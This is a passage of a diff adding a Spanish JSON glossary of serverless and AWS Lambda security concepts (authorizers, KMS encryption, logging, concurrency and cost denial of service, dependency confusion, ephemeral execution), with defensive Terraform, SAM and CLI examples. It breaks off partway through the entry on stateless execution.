@@ -1,0 +1,392 @@
+{
+  "Actualización de runtime": {
+    "que": "Proceso de migración y mantenimiento del entorno de ejecución gestionado (como Python, Node.js, Java o .NET) sobre el que corre una función serverless cuando el proveedor publica parches o retira versiones obsoletas. En arquitecturas FaaS el proveedor parchea el sistema operativo subyacente y el runtime gestionado hasta que alcanza su fecha de fin de soporte (EOL).",
+    "para": "Evita que las funciones queden expuestas a vulnerabilidades conocidas en intérpretes, bibliotecas estándar o TLS, y previene bloqueos operativos cuando el proveedor deshabilita la creación o actualización de funciones con runtimes depreciados. Se aplica de forma continua durante el ciclo de vida de aplicaciones en producción.",
+    "como": "En AWS Lambda, la propiedad `Runtime` (o el campo `RuntimeManagementConfig`) controla cómo se aplican los parches del runtime: `Auto` actualiza automáticamente en cada despliegue o invocación gestionada, `FunctionUpdate` solo cambia la versión al redesplegar y `Manual` fija un ARN específico (`RuntimeVersionArn`). Cuando un runtime llega a EOL (Phase 1 bloquea creación y Phase 2 bloquea actualizaciones), el equipo debe probar la compatibilidad de dependencias en un entorno previo, actualizar el runtime en IaC (Terraform, SAM o CDK) y redesplegar con tráfico gradual mediante alias y pesos.",
+    "practicas": [
+      "Configurar alertas de AWS Health / Advisor o equivalente en Azure/GCP para detectar funciones en runtimes próximos a EOL antes de que se bloqueen los despliegues.",
+      "Usar `RuntimeManagementConfig` en modo `Auto` para parches menores y probar actualizaciones mayores (p. ej. Python 3.9 a 3.12) en entornos de staging con pruebas de integración.",
+      "Error típico: fijar un `RuntimeVersionArn` manual por una regresión puntual y olvidarlo indefinidamente, dejando la función sin parches de seguridad.",
+      "Comparación: con runtimes gestionados (ZIP) el proveedor aplica parches de seguridad del intérprete; con imágenes de contenedor en Lambda la responsabilidad de actualizar el OS base y el runtime recae íntegramente en tu pipeline."
+    ],
+    "ejemplo": "resource \"aws_lambda_function\" \"api\" {\n  function_name = \"orders-handler\"\n  runtime       = \"python3.12\"\n  runtime_management_config {\n    update_runtime_on = \"Auto\"\n  }\n}",
+    "entrevista": "En serverless, usar runtimes gestionados delega el parcheo menor al proveedor, pero las actualizaciones mayores de versión requieren pruebas automatizadas en IaC antes del fin de soporte para evitar deuda técnica y pérdida de cobertura de seguridad."
+  },
+  "Authorizer JWT": {
+    "que": "Mecanismo nativo de API Gateway (especialmente en HTTP APIs) que valida tokens JSON Web Token (JWT) emitidos por un proveedor de identidad compatible con OpenID Connect (OIDC) o OAuth 2.0 antes de invocar el backend serverless. Verifica firma criptográfica, emisor, audiencia y expiración sin ejecutar código personalizado.",
+    "para": "Descarga la autenticación y verificación básica de autorización del código de la función Lambda hacia la capa perimetral de API Gateway, reduciendo superficie de ataque, latencia y coste por invocaciones no autenticadas. Se utiliza cuando las APIs consumen tokens estándar de IdPs como Auth0, Okta, Entra ID o Cognito.",
+    "como": "Al recibir una petición, API Gateway extrae el token de la cabecera configurada (habitualmente `Authorization: Bearer <token>`) y consulta el endpoint `/.well-known/openid-configuration` del `issuer` configurado para obtener y cachear las claves públicas JWKS. Comprueba la firma criptográfica (RS256/ES256), valida que el claim `iss` coincida con el emisor, `aud` con los `audience` permitidos, `exp`/`nbf` con el reloj actual y opcionalmente los `scope` requeridos. Si es válido, inyecta los claims decodificados en `event.requestContext.authorizer.jwt.claims` hacia la función Lambda.",
+    "practicas": [
+      "Validar siempre de forma estricta `issuer` y `audience` para impedir que tokens legítimos emitidos para otra aplicación o cliente del mismo IdP accedan a tu API.",
+      "Exigir `authorizationScopes` por ruta para aplicar control de acceso granular en el gateway y validar en Lambda la autorización a nivel de recurso (BOLA/IDOR) usando el claim `sub`.",
+      "Error típico: olvidar validar autorización de negocio dentro de Lambda asumiendo que tener un JWT válido implica permiso sobre cualquier `id` de recurso.",
+      "Comparación: el Authorizer JWT de HTTP APIs ofrece menor latencia y coste que un Lambda Authorizer, pero no soporta lógica compleja de autorización externa ni APIs REST v1 sin Cognito o Lambda."
+    ],
+    "ejemplo": "Resources:\n  HttpApi:\n    Type: AWS::Serverless::HttpApi\n    Properties:\n      Auth:\n        DefaultAuthorizer: JwtAuth\n        Authorizers:\n          JwtAuth:\n            JwtConfiguration:\n              issuer: https://cognito-idp.us-east-1.amazonaws.com/us-east-1_abc\n              audience: [\"25a9b8c7d6\"]\n            IdentitySource: \"$request.header.Authorization\"",
+    "entrevista": "Un Authorizer JWT en API Gateway valida firma, emisor, audiencia y scopes en el borde sin coste de cómputo en Lambda, pero la función sigue siendo responsable de comprobar la autorización a nivel de objeto usando los claims propagados."
+  },
+  "Authorizer de Cognito": {
+    "que": "Tipo de autorizador integrado en Amazon API Gateway (REST API) que utiliza un Amazon Cognito User Pool para validar automáticamente tokens JWT de acceso o identidad emitidos por dicho User Pool. Actúa como barrera de autenticación declarativa sin necesidad de mantener una función Lambda autorizadora.",
+    "para": "Simplifica la protección de endpoints serverless cuando la gestión de usuarios, registro, MFA y emisión de tokens reside en Amazon Cognito. Evita escribir, desplegar y asegurar código de verificación de tokens en cada microservicio.",
+    "como": "El cliente se autentica contra Cognito User Pool y obtiene un `IdToken` o `AccessToken` firmado con RS256. Al llamar a API Gateway enviando el token en la cabecera configurada (por defecto `Authorization`), API Gateway valida la firma contra las claves públicas de ese User Pool específico, comprueba expiración y, si se configuraron `OAuth Scopes` en el método, exige que el `AccessToken` incluya dichos alcances (en lugar del `IdToken`). Tras aprobar la petición, reenvía los claims en `event.requestContext.authorizer.claims` a la integración.",
+    "practicas": [
+      "Preferir `AccessToken` con `AuthorizationScopes` definidos en lugar de `IdToken` para autorizar llamadas a APIs, siguiendo las buenas prácticas de OAuth 2.0.",
+      "Restringir qué atributos de usuario pueden escribirse desde el cliente en el User Pool (p. ej. impedir que un usuario modifique `custom:role`), para evitar escalada de privilegios vía claims.",
+      "Error típico: habilitar Cognito Authorizer solo en algunos métodos (`GET`) y dejar `POST` o `OPTIONS` mal configurados o sin autorizador en APIs sensibles.",
+      "Comparación: un Authorizer de Cognito solo valida tokens de Cognito User Pools en REST APIs; si necesitas federación multi-IdP arbitraria o políticas dinámicas en HTTP APIs, conviene usar un Authorizer JWT genérico o un Lambda Authorizer."
+    ],
+    "ejemplo": "resource \"aws_api_gateway_authorizer\" \"cognito\" {\n  name          = \"cognito-userpool-auth\"\n  type          = \"COGNITO_USER_POOLS\"\n  rest_api_id   = aws_api_gateway_rest_api.api.id\n  provider_arns = [aws_cognito_user_pool.users.arn]\n}",
+    "entrevista": "El Authorizer de Cognito delega la validación de tokens a API Gateway acoplado al User Pool, siendo clave usar Access Tokens con scopes explícitos y proteger los atributos modificables del perfil para evitar manipulación de claims."
+  },
+  "Autorización en API Gateway": {
+    "que": "Conjunto de mecanismos de control de acceso que ofrece API Gateway para autenticar y autorizar peticiones entrantes antes de que alcancen los backends serverless (Lambda, Step Functions, DynamoDB). Incluye políticas de recursos, IAM (SigV4), Cognito User Pools, JWT Authorizers, Lambda Authorizers y mTLS.",
+    "para": "Establece una defensa en profundidad en el borde de la API, bloqueando tráfico no autorizado o malicioso antes de consumir ejecuciones Lambda o recursos internos. Permite unificar la política de acceso de múltiples microservicios tras una única puerta de enlace.",
+    "como": "Cuando llega una solicitud HTTP, API Gateway evalúa primero la Resource Policy (IPs permitidas, VPC endpoints, cuentas AWS) y el certificado cliente si mTLS está activo. Luego ejecuta el autorizador configurado en la ruta o método: IAM verifica la firma SigV4 y evalúa políticas IAM; JWT/Cognito validan firma y claims; o un Lambda Authorizer recibe el token/cabeceras (`TOKEN` o `REQUEST`), decide `Allow`/`Deny` devolviendo una política IAM (o booleano `isAuthorized` en formato v2) y opcionalmente cachea el resultado por TTL. Solo si todas las capas aprueban, se invoca la integración.",
+    "practicas": [
+      "Desactivar el endpoint público por defecto (`disable_execute_api_endpoint`) cuando se use un dominio personalizado con WAF o cuando la API sea estrictamente privada vía VPC Endpoint.",
+      "En Lambda Authorizers tipo `TOKEN`, cuidado con la caché por token si el permiso depende de ruta/método (`methodArn`): usar políticas con comodín controlado o caché por contexto `REQUEST` para no denegar erróneamente rutas hermanas.",
+      "Combinar autenticación en el Gateway con autorización de negocio en la función (defensa contra BOLA/BFLA) y AWS WAF para mitigar abuso y bots.",
+      "Comparación: IAM (SigV4) es ideal para comunicación servicio-a-servicio dentro de AWS; JWT/Cognito para usuarios finales; y mTLS para socios B2B o dispositivos IoT."
+    ],
+    "ejemplo": "{\n  \"principalId\": \"user-123\",\n  \"policyDocument\": {\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [{\n      \"Action\": \"execute-api:Invoke\",\n      \"Effect\": \"Allow\",\n      \"Resource\": \"arn:aws:execute-api:us-east-1:123456789012:apiId/prod/GET/orders/*\"\n    }]\n  }\n}",
+    "entrevista": "La autorización en API Gateway actúa como primer filtro criptográfico y de políticas en el borde mediante IAM, JWT, Cognito, Lambda Authorizers o mTLS, evitando invocar funciones Lambda con tráfico no autenticado."
+  },
+  "Cifrado KMS en Lambda": {
+    "que": "Uso de AWS Key Management Service (KMS) con claves gestionadas por el cliente (CMK) o gestionadas por AWS para cifrar los datos en reposo asociados a una función Lambda, incluyendo variables de entorno y, opcionalmente, el artefacto de código o almacenamiento temporal.",
+    "para": "Garantiza la confidencialidad de configuraciones sensibles y código desplegado frente a accesos indebidos al almacenamiento subyacente, permitiendo control granular de quién puede descifrar, rotación automática de claves y trazabilidad completa en CloudTrail. Es requisito frecuente en normativas como PCI-DSS, HIPAA o ISO 27001.",
+    "como": "Durante el despliegue, Lambda cifra las variables de entorno en reposo utilizando una clave KMS (por defecto `aws/lambda`, o una CMK indicada en `KmsKeyArn`). Al inicializar el entorno de ejecución (cold start), el servicio Lambda descifra las variables invocando `kms:Decrypt` bajo el contexto de cifrado de la función (`aws:lambda:FunctionName`) y las expone en memoria como texto plano dentro de `process.env` o `os.environ`. Si se usan secretos cifrados en el cliente con KMS antes de desplegar, el rol de ejecución de la función necesita permiso explícito `kms:Decrypt` con condición sobre el contexto para descifrarlos en tiempo de ejecución.",
+    "practicas": [
+      "Especificar una CMK (Customer Managed Key) con política restrictiva en lugar de la clave por defecto `aws/lambda` cuando se requiera segregación de funciones o auditoría de descifrado.",
+      "Cifrar valores sensibles en el lado cliente (usando Encryption Helpers) además del cifrado en reposo de Lambda, para que ni siquiera aparezcan en texto plano en la consola de AWS Lambda.",
+      "Error típico: olvidar añadir `kms:Decrypt` (o restringirlo mal con `EncryptionContext`) en la política de la CMK cuando el código descifra blobs propios o lee secretos de Secrets Manager cifrados con CMK.",
+      "Comparación: el cifrado KMS de variables de entorno protege en reposo en el plano de control, pero las variables siguen visibles en texto plano dentro de la consola para quien tenga `lambda:GetFunctionConfiguration` salvo que se cifren previamente."
+    ],
+    "ejemplo": "resource \"aws_lambda_function\" \"processor\" {\n  function_name = \"payment-processor\"\n  kms_key_arn   = aws_kms_key.lambda_env_cmk.arn\n  environment {\n    variables = { ENCRYPTED_KEY = var.kms_ciphertext_blob }\n  }\n}",
+    "entrevista": "El cifrado KMS en Lambda con CMK protege variables de entorno en reposo con auditoría en CloudTrail y control de acceso por contexto, aunque para evitar exposición en consola o plano de control los secretos deben ir cifrados en cliente o residir en Secrets Manager."
+  },
+  "Cifrado de variables de entorno": {
+    "que": "Práctica y mecanismo de protección criptográfica aplicada a los pares clave-valor pasados como variables de entorno a una función serverless, distinguiendo entre el cifrado en reposo gestionado por la plataforma y el cifrado previo del valor antes del despliegue.",
+    "para": "Reduce el riesgo de exposición de configuraciones sensibles en caso de compromiso del almacenamiento del proveedor, fugas en logs de consola, capturas de pantalla de la interfaz web o acceso excesivo de lectura de configuración por parte de desarrolladores u operadores.",
+    "como": "Por defecto, AWS Lambda cifra las variables de entorno en reposo usando la clave KMS gestionada `aws/lambda` y las descifra automáticamente al arrancar el entorno de ejecución, dejándolas en texto plano en la consola y en las respuestas de la API `GetFunctionConfiguration`. Para evitar esta exposición en el plano de control, se aplica cifrado en cliente (`kms:Encrypt` con `EncryptionContext` igual al nombre de la función) almacenando el blob en Base64 en la variable, y el código de la función ejecuta `kms:Decrypt` en el arranque (cold start) guardando el valor únicamente en memoria.",
+    "practicas": [
+      "No guardar secretos de alto impacto (credenciales de BD, llaves privadas, API keys) en variables de entorno sin cifrar en cliente; preferir Secrets Manager o Parameter Store SecureString.",
+      "Usar siempre `EncryptionContext` al cifrar blobs para variables de entorno, impidiendo que una función con acceso a la misma clave KMS descifre secretos de otra función.",
+      "Error típico: pensar que porque AWS marca \"cifrado en reposo\" las variables están ocultas en la consola IAM o protegidas frente a un volcado de `env` tras un RCE o inyección.",
+      "Comparación: el cifrado de variables de entorno evita rotación centralizada automática, mientras que Secrets Manager ofrece rotación nativa y versionado sin redesplegar la función."
+    ],
+    "ejemplo": "import os, base64, boto3\n\nENCRYPTED = os.environ['API_TOKEN_ENC']\nDECRYPTED = boto3.client('kms').decrypt(\n    CiphertextBlob=base64.b64decode(ENCRYPTED),\n    EncryptionContext={'LambdaFunctionName': os.environ['AWS_LAMBDA_FUNCTION_NAME']}\n)['Plaintext'].decode()",
+    "entrevista": "El cifrado nativo de variables de entorno protege solo en reposo y las deja legibles en la API de configuración; para proteger secretos reales se usa Secrets Manager o cifrado en cliente con KMS y EncryptionContext."
+  },
+  "CloudWatch Logs para Lambda": {
+    "que": "Integración nativa de AWS Lambda con Amazon CloudWatch Logs mediante la cual la salida estándar (`stdout`/`stderr`) y los eventos del ciclo de vida (`START`, `END`, `REPORT`) de cada invocación se envían automáticamente a un Log Group `/aws/lambda/<nombre-funcion>`.",
+    "para": "Proporciona visibilidad operativa, auditoría forense y detección de incidentes sobre ejecuciones efímeras que desaparecen al reciclarse el microcontenedor. Permite investigar errores, anomalías de latencia, intentos de explotación y patrones de abuso.",
+    "como": "El rol de ejecución de la función requiere permisos `logs:CreateLogGroup`, `logs:CreateLogStream` y `logs:PutLogEvents` sobre el ARN específico de su grupo de logs. El entorno Lambda captura los flujos estándar y los envía de forma asíncrona mediante la Telemetry API sin bloquear la respuesta de la función. Cada invocación genera flujos por instancia de ejecución (`LogStream`), que pueden cifrarse con una CMK de KMS y enviarse mediante Subscription Filters a un SIEM, Kinesis o S3 para retención y correlación.",
+    "practicas": [
+      "Configurar explícitamente la retención del Log Group (p. ej. 30, 90 o 365 días según cumplimiento) en IaC; de lo contrario CloudWatch conserva los logs indefinidamente acumulando coste y riesgo de privacidad.",
+      "Restringir los permisos IAM del rol Lambda al ARN exacto `/aws/lambda/<funcion>:*` en lugar de `Resource: \"*\"`.",
+      "Cifrar el Log Group con KMS CMK y activar políticas de protección de datos en CloudWatch Logs para enmascarar PII, tarjetas o tokens accidentalmente impresos.",
+      "Pre-crear el Log Group en Terraform/CloudFormation antes que la función evita que Lambda lo cree sin retención ni cifrado en la primera invocación."
+    ],
+    "ejemplo": "resource \"aws_cloudwatch_log_group\" \"lambda_logs\" {\n  name              = \"/aws/lambda/${var.function_name}\"\n  retention_in_days = 90\n  kms_key_id        = aws_kms_key.logs_cmk.arn\n}",
+    "entrevista": "En CloudWatch Logs para Lambda es fundamental pre-crear el Log Group en IaC con retención definida, cifrado KMS y permisos IAM acotados al ARN de la función para garantizar observabilidad segura sin fugas de datos ni costes ilimitados."
+  },
+  "Cold start": {
+    "que": "Latencia adicional que ocurre cuando el proveedor serverless debe aprovisionar un nuevo entorno de ejecución aislado (microVM o contenedor), descargar el código/imagen, iniciar el runtime y ejecutar el código de inicialización global antes de procesar la primera petición.",
+    "para": "Comprender el cold start es clave tanto para la disponibilidad (evitar timeouts en cascada y DoS) como para la seguridad, ya que la fase `Init` determina dónde se cargan secretos, conexiones TLS y verificaciones de integridad sin penalizar cada invocación.",
+    "como": "Cuando llega una petición y no hay instancias calientes disponibles (primera invocación, pico de concurrencia o reciclaje), el plano de control asigna un worker con Firecracker/sandbox, monta la capa/paquete o extrae la imagen de contenedor, arranca el intérprete y ejecuta el código fuera del handler (fase `Init`, habitualmente limitada a 10 s en Lambda salvo SnapStart). Posteriormente ejecuta la función `handler` (fase `Invoke`). Las invocaciones sucesivas reutilizan ese mismo entorno caliente conservando en memoria clientes SDK, pools y caché en `/tmp`.",
+    "practicas": [
+      "Cargar secretos de Secrets Manager, clientes HTTPS y claves públicas JWKS fuera del `handler` (en la fase de inicialización) con caché y TTL, reduciendo latencia y coste en invocaciones calientes.",
+      "Minimizar el tamaño del paquete de despliegue y dependencias: paquetes pesados agravan los cold starts y amplían la superficie de ataque.",
+      "Evaluar amenazas de Denegación de Servicio por cold start: un atacante puede forzar concurrencia paralela o paquetes grandes para saturar la capacidad o provocar timeouts en endpoints críticos.",
+      "Comparación: Provisioned Concurrency elimina cold starts manteniendo entornos pre-inicializados (con coste fijo y riesgo de estado residual prolongado), mientras que `SnapStart` (Java/Python/.NET en AWS) restaura snapshots cifrados de memoria."
+    ],
+    "ejemplo": "import boto3\n# Fase INIT (solo en cold start): reutilizado en invocaciones calientes\nsm_client = boto3.client(\"secretsmanager\")\n\ndef handler(event, context):\n    # Fase INVOKE: lógica por petición\n    return {\"statusCode\": 200}",
+    "entrevista": "El cold start corresponde a la fase de inicialización de una nueva microVM serverless; aprovecharla para cargar clientes y secretos cacheados optimiza el rendimiento, mientras que reducir dependencias mitiga tanto la latencia como la superficie de ataque."
+  },
+  "Conector VPC": {
+    "que": "Mecanismo de red gestionado que permite a funciones serverless ejecutarse con conectividad privada hacia recursos dentro de una Virtual Private Cloud (VPC), sin exponer dichos recursos a Internet pública. En AWS se implementa mediante Hyperplane ENIs; en GCP como Serverless VPC Access Connector y en Azure mediante VNet Integration.",
+    "para": "Permite que las funciones serverless accedan de forma segura a bases de datos privadas (RDS, Redis), servicios internos en subredes privadas o APIs on-premise a través de VPN/Direct Connect, manteniendo el aislamiento de red y cumpliendo requisitos de segmentación.",
+    "como": "Al asociar una función Lambda a subredes y Security Groups de una VPC, AWS crea una Hyperplane Elastic Network Interface (ENI) compartida por función/combinación de subred y Security Group, vinculada a las microVMs de Firecracker mediante túneles de red internos. Todo el tráfico saliente de la función entra a la subred privada elegida y queda sujeto a las tablas de rutas, NACLs y Security Groups. La función pierde acceso directo a Internet a menos que se enrute a través de un NAT Gateway en subred pública o utilice VPC Endpoints para servicios AWS.",
+    "practicas": [
+      "Colocar las funciones en subredes privadas con Security Groups de salida mínimos (egress restrictivo solo hacia el puerto y grupo de destino necesario, como 5432 hacia RDS).",
+      "Desplegar en al menos dos Zonas de Disponibilidad (AZ) para alta disponibilidad y dimensionar correctamente el rango CIDR de las subredes (evitar agotamiento de IPs en picos de concurrencia).",
+      "Usar VPC Endpoints (Gateway para S3/DynamoDB, Interface para Secrets Manager/KMS) en lugar de NAT Gateway cuando solo se consuman servicios AWS, reduciendo costes y evitando tráfico saliente hacia Internet.",
+      "Error típico: creer que poner una Lambda en una VPC mejora su seguridad automáticamente; la función sigue siendo invocable mediante IAM/API Gateway y requiere controles de red saliente y autenticación."
+    ],
+    "ejemplo": "resource \"aws_lambda_function\" \"db_worker\" {\n  function_name = \"db-worker\"\n  vpc_config {\n    subnet_ids         = [aws_subnet.private_a.id, aws_subnet.private_b.id]\n    security_group_ids = [aws_security_group.lambda_egress_only.id]\n  }\n}",
+    "entrevista": "El conector VPC enruta el tráfico saliente de una función serverless a través de subredes privadas y Security Groups para acceder de forma aislada a recursos internos como RDS, pero exige configurar VPC Endpoints o NAT si la función necesita consumir APIs externas o servicios AWS."
+  },
+  "Denegación de servicio por concurrencia": {
+    "que": "Ataque o condición de fallo en la que se agota el límite de ejecuciones simultáneas (concurrencia) de una función serverless o de toda la cuenta en una región, impidiendo que peticiones legítimas sean atendidas y devolviendo errores de limitación (`429 TooManyRequestsException`).",
+    "para": "Identificar y mitigar este vector protege la disponibilidad crítica de toda la plataforma serverless, ya que en entornos FaaS todas las funciones de una misma cuenta y región comparten por defecto un pool global de concurrencia.",
+    "como": "Un atacante (o un bucle infinito de eventos, p. ej. una función que escribe en el mismo bucket S3 que la dispara) genera miles de invocaciones paralelas o peticiones lentas que mantienen ocupadas las instancias durante segundos. Cuando las ejecuciones activas alcanzan la cuota regional de la cuenta (por defecto 1000 en AWS Lambda), el plano de control rechaza nuevas invocaciones síncronas con HTTP 429 y encola o descarta las asíncronas, provocando una denegación de servicio transversal sobre otras funciones críticas no relacionadas.",
+    "practicas": [
+      "Configurar `ReservedConcurrency` en funciones críticas para garantizarles capacidad dedicada y también en funciones públicas o no críticas para acotar cuánto pool pueden consumir (actúa como techo máximo).",
+      "Aplicar throttling y cuotas por cliente (Rate Limiting / Usage Plans / AWS WAF) en API Gateway o Function URLs antes de llegar a Lambda.",
+      "Prevenir bucles recursivos en arquitecturas orientadas a eventos (S3, SQS, SNS) separando buckets de origen/destino y habilitando la detección de bucles recursivos del proveedor.",
+      "Error típico: poner `ReservedConcurrency = 0` pensando que limita sin apagar, cuando en realidad deshabilita completamente las invocaciones de esa función."
+    ],
+    "ejemplo": "resource \"aws_lambda_function\" \"public_webhook\" {\n  function_name                  = \"public-webhook\"\n  reserved_concurrent_executions = 50\n}",
+    "entrevista": "Dado que la concurrencia se comparte a nivel de cuenta y región, un pico malicioso o un bucle de eventos en una función puede tumbar todo el sistema; la defensa pasa por throttling en el gateway y límites de Reserved Concurrency."
+  },
+  "Denegación de servicio por coste": {
+    "que": "Variante de ataque conocida como Denial of Wallet (DoW), en la que un atacante abusa del modelo de pago por uso de la arquitectura serverless generando invocaciones masivas, tiempos de ejecución prolongados o transferencias de datos elevadas para provocar una factura económicamente insostenible.",
+    "para": "Prevenir la Denegación de Servicio por Coste evita daños financieros severos, agotamiento de presupuestos cloud y la posible suspensión forzosa de servicios por parte de la organización ante alertas de facturación.",
+    "como": "A diferencia del DoS tradicional donde el servidor colapsa por CPU/RAM, el escalado automático FaaS absorbe la carga maliciosa generando miles de invocaciones paralelas. El atacante explota endpoints públicos sin autenticación, payloads costosos en CPU/memoria (ReDoS, deserialización pesada, compresión), funciones con timeout máximo (15 minutos en Lambda) o lecturas repetidas a bases de datos/egress de red. Cada milisegundo y GB-segundo facturado escala linealmente con el tráfico atacante hasta agotar cuotas o presupuesto.",
+    "practicas": [
+      "Ajustar el `timeout` y la memoria de cada función al mínimo operativo real (evitar dejar el timeout por defecto alto en APIs síncronas de 15 minutos).",
+      "Implementar AWS WAF con reglas de Rate Limiting, validación estricta de esquemas/tamaño de payload en API Gateway y autenticación previa a invocaciones costosas.",
+      "Establecer límites de `ReservedConcurrency` en funciones expuestas y configurar AWS Budgets / CloudWatch Billing Alarms con notificaciones inmediatas.",
+      "Evitar expresiones regulares vulnerables a ReDoS o procesamientos no acotados sobre entradas controladas por el usuario."
+    ],
+    "ejemplo": "resource \"aws_wafv2_web_acl\" \"api_rate_limit\" {\n  name  = \"api-dow-protection\"\n  scope = \"REGIONAL\"\n  rule {\n    name     = \"RateLimitPerIP\"\n    priority = 1\n    action { block {} }\n    statement { rate_based_statement { limit = 500; aggregate_key_type = \"IP\" } }\n  }\n}",
+    "entrevista": "En serverless el autoescalado convierte un ataque de tráfico en un Denial of Wallet; se mitiga acotando timeouts, limitando concurrencia reservada, filtrando en el borde con WAF/rate limiting y vigilando presupuestos en tiempo real."
+  },
+  "Dependencias vulnerables en función": {
+    "que": "Presencia de bibliotecas o paquetes de terceros con vulnerabilidades conocidas (CVE) empaquetados dentro del artefacto ZIP, capa (Lambda Layer) o imagen de contenedor de una función serverless.",
+    "para": "Gestionar y eliminar dependencias vulnerables reduce el riesgo de ejecución remota de código (RCE), deserialización insegura, SSRF o exfiltración de credenciales IAM desde dentro de la función, dado que el código propio suele representar una fracción mínima frente a las librerías importadas.",
+    "como": "Durante la construcción del paquete (`npm install`, `pip install`, `mvn package`), se incluyen dependencias directas y transitivas que quedan integradas en el runtime de la función. Si un atacante envía un payload especialmente diseñado a través de API Gateway, S3 o SQS que alcanza una función vulnerable (como Prototype Pollution en Node.js o deserialización en Python/Java), puede ejecutar comandos arbitrarios en el entorno efímero y consultar el endpoint de credenciales o las variables de entorno del proceso.",
+    "practicas": [
+      "Integrar análisis de composición de software (SCA como Trivy, Snyk, Grype o Dependabot) en el pipeline CI/CD antes de desplegar, bloqueando severidades críticas/altas.",
+      "Activar Amazon Inspector para AWS Lambda, que escanea automáticamente tanto los paquetes de aplicación como las capas asociadas y notifica nuevos CVEs de forma continua.",
+      "Aplicar tree-shaking/bundling (p. ej. esbuild) y usar lockfiles (`package-lock.json`, `poetry.lock`) con hashes fijados para incluir solo el código estrictamente ejecutado.",
+      "Error típico: usar una imagen o Lambda Layer compartida hace meses sin reconstruirla periódicamente, acumulando dependencias desactualizadas."
+    ],
+    "ejemplo": "trivy fs --scanners vuln --severity HIGH,CRITICAL --exit-code 1 ./lambda-src/",
+    "entrevista": "Como una función serverless suele contener mucho más código de terceros que código propio, es imprescindible aplicar SCA en CI/CD, usar lockfiles y habilitar escaneo continuo como Amazon Inspector sobre funciones y capas."
+  },
+  "Dependency confusion en serverless": {
+    "que": "Ataque a la cadena de suministro en el que un adversario publica un paquete malicioso en un registro público (PyPI, npm, Maven) con el mismo nombre que una dependencia interna privada utilizada por la función serverless, logrando que el pipeline de build o el gestor de paquetes descargue la versión maliciosa.",
+    "para": "Proteger contra dependency confusion evita la inyección de código malicioso en el paquete de despliegue serverless antes incluso de llegar a producción, previniendo robo de secretos de CI/CD, modificación de artefactos y backdoors en funciones Lambda.",
+    "como": "Cuando un `package.json` o `requirements.txt` referencia un paquete interno sin alcance (scope) o sin fijar el repositorio de origen, herramientas como `pip` (con `--extra-index-url`) o `npm` consultan tanto el registro privado como el registro público y suelen elegir la versión numérica más alta. Un atacante que descubre el nombre del paquete interno (vía código filtrado, errores o repositorios) registra ese nombre en npm/PyPI con versión `99.9.9` y código en `setup.py` o `postinstall`. Al empaquetar la función serverless en CI/CD, se descarga e instala el paquete malicioso.",
+    "practicas": [
+      "Usar namespaces o scopes reservados y registrados (como `@mi-org/paquete` en npm) y configurar registros privados mediante proxies upstream (AWS CodeArtifact, Artifactory) sin consultar directamente índices públicos por prioridad.",
+      "En Python, nunca usar `--extra-index-url` para paquetes internos junto a PyPI; usar `--index-url` apuntando al repositorio privado que proxifica PyPI y bloquea colisiones.",
+      "Habilitar verificación de hashes en lockfiles (`pip install --require-hashes`, `npm ci`) y desactivar scripts de ciclo de vida (`--ignore-scripts`) cuando no sean necesarios.",
+      "Generar SBOMs de cada artefacto Lambda para auditar el origen exacto de cada librería empaquetada."
+    ],
+    "ejemplo": "# Mal: --extra-index-url consulta PyPI y el repo privado a la vez\n# Bien: solo índice privado con upstream configurado (CodeArtifact)\npip install --index-url https://org-domain.d.codeartifact.us-east-1.amazonaws.com/pypi/internal/simple/ --require-hashes -r requirements.txt",
+    "entrevista": "Dependency confusion ocurre cuando el gestor de paquetes prioriza un paquete público con versión mayor sobre uno interno; en serverless se previene con scopes privados, proxies de repositorio como CodeArtifact, lockfiles con hashes y evitando `--extra-index-url`."
+  },
+  "Ejecución efímera": {
+    "que": "Característica de los entornos FaaS donde las instancias de ejecución (microVMs o contenedores) se crean bajo demanda para procesar invocaciones y se destruyen automáticamente tras un periodo de inactividad o al superar su vida útil máxima.",
+    "para": "Desde el punto de vista de seguridad, la efimeridad limita drásticamente la persistencia de un atacante dentro del cómputo (habitualmente minutos u horas), dificultando implantes duraderos en disco o memoria y reduciendo la ventana de movimiento lateral.",
+    "como": "Cuando se invoca una función, el orquestador inicia una microVM con un sistema de archivos raíz de solo lectura y un directorio `/tmp` escribible de tamaño acotado. Tras finalizar el handler, el entorno queda congelado (`freeze`) esperando nuevas invocaciones; si no llegan en unos minutos o tras unas horas de vida total, la instancia se destruye junto con su memoria y `/tmp`. Cualquier malware o fichero temporal guardado en `/tmp` desaparece al reciclarse la instancia, pero sobrevive entre invocaciones calientes consecutivas mientras la instancia siga viva.",
+    "practicas": [
+      "Asumir que la efimeridad NO impide la exfiltración instantánea: un atacante con RCE puede robar el token temporal del rol IAM o variables de entorno en milisegundos antes de que la instancia muera.",
+      "Limpiar datos sensibles o archivos temporales escritos en `/tmp` al finalizar el `handler` dentro de un bloque `finally`, evitando que otra invocación reutilice datos residuales en un entorno caliente.",
+      "Enviar logs, métricas y trazas de seguridad en tiempo real fuera de la instancia (CloudWatch, Telemetry API), ya que el análisis forense post-mortem en disco es imposible tras destruirse la microVM.",
+      "Error típico: confiar en la efimeridad como sustituto de permisos IAM mínimos o validación de entradas."
+    ],
+    "ejemplo": "import os, tempfile\n\ndef handler(event, context):\n    fd, path = tempfile.mkstemp(dir=\"/tmp\")\n    try:\n        # procesar archivo sensible\n        pass\n    finally:\n        os.close(fd)\n        if os.path.exists(path): os.remove(path)",
+    "entrevista": "La ejecución efímera dificulta la persistencia tradicional del atacante en disco, pero no impide el robo inmediato de credenciales en memoria ni evita fugas entre invocaciones calientes si no se limpia `/tmp`."
+  },
+  "Ejecución sin estado": {
+    "que": "Principio arquitectónico de serverless (stateless) según el cual cada invocación de una función debe ser independiente y no puede depender de memoria local, sesiones en RAM o archivos en disco persistidos entre llamadas, externalizando cualquier estado duradero a servicios gestionados.",
+    "para": "Permite el escalado horizontal automático e inmediato entre múltiples instancias aisladas, elimina la gestión de sesiones locales vulnerables a fijación/desincronización y obliga a centralizar el estado en almacenes con control de acceso, cifrado y auditoría propios.",
+    "como": "El runtime FaaS puede dirigir dos peticiones consecutivas del mismo usuario a microVMs completamente distintas o destruir la instancia entre llamadas. Por ello, los tokens de sesión, estados de flujo o caché compartida se externalizan a DynamoDB, ElastiCache, S3 o Step Functions mediante llamadas autenticadas por IAM y cifradas por TLS. Si una función almacena accidentalmente datos de un usuario en una variable global del módulo o en `/tmp`, otra petición en el mismo contenedor caliente podría leer o sobrescribir ese estado (contaminación cruzada de contexto).",
+    "practicas": [
